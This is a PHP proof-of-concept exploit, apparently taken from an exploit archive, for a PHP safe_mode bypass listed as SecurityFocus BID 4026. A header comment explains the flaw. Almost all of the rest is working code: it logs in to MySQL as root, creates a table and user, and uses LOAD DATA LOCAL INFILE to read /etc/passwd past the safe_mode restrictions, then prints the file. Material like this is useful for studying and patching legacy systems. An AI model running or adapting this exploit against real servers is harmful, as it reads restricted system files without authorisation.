<?php
/* 
source: http://www.securityfocus.com/bid/4026/info
 
PHP's 'safe_mode' feature may be used to restrict access to certain areas of a filesystem by PHP scripts. However, a problem has been discovered that may allow an attacker to bypass these restrictions to gain unauthorized access to areas of the filesystem that are restricted when PHP 'safe_mode' is enabled.
 
In particular, the MySQL client library that ships with PHP fails to properly honor 'safe_mode'. As a result, a user can issue a LOAD DATA statement to read files that reside in restricted areas of the filesystem (as determined by 'safe_mode').
*/

file_get_contents('/etc/passwd');

$l = mysql_connect("localhost", "root");
mysql_query("CREATE DATABASE a");
mysql_query("CREATE TABLE a.a (a varchar(1024))");
mysql_query("GRANT SELECT,INSERT ON a.a TO 'aaaa'@'localhost'");
mysql_close($l); mysql_connect("localhost", "aaaa");

mysql_query("LOAD DATA LOCAL INFILE '/etc/passwd' INTO TABLE a.a");

$result = mysql_query("SELECT a FROM a.a");
while(list($row) = mysql_fetch_row($result))
    print $row . chr(10);

?>